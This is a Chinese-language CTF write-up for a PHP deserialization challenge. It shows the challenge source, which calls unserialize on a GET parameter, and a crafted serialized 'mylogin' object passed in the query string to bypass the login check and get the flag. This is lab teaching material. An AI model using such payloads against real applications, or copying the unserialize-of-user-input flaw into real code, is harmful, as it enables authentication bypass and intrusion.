---
title: CTF之PHP反序列化2
date: 2025-11-19 14:54:02
tags: 
    - CTF 
    - Web
    - 渗透测试
    - PHP
---

# PHP反序列化2

## 题目

序列化迷城 2：数字迷宫

在激活了第一个神器后，铁柱发现这只是通往更大秘密的入口。教授设计了一个复杂的数字迷宫，只有通过特定的身份验证才能进入迷宫的核心区域。迷宫的守卫是一个登录系统。但铁柱很快意识到，系统存在反序列化漏洞，他可以通过构造特殊的序列化对象来绕过身份验证，进入迷宫的深处寻找下一个线索。

## 解题步骤：

打开题目得到页面：

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");
class mylogin
{
    var $user;
    var $pass;
    function __construct($user, $pass)
    {
        $this->user = $user;
        $this->pass = $pass;
    }
    function login()
    {
        if ($this->user == "daydream" and $this->pass == "ok") {
            return 1;
        }
    }
}
$a = unserialize($_GET['param']);
if ($a->login()) {
    echo $flag;
}
?> 
```

我们看到要想`echo $flag;`，首先需要让`$a->login()`为true，而这里变量`$a`可控（`$a = unserialize($_GET['param']);`），我们可以尝试构造`param`：

```php
O:<类名长度>:"类名":<属性数量>:{<属性>}
```

根据`mylogin`，构造：

```
?param=O:7:"mylogin":2:{s:4:"user";s:8:"daydream";s:4:"pass";s:2:"ok";}
```

得到flag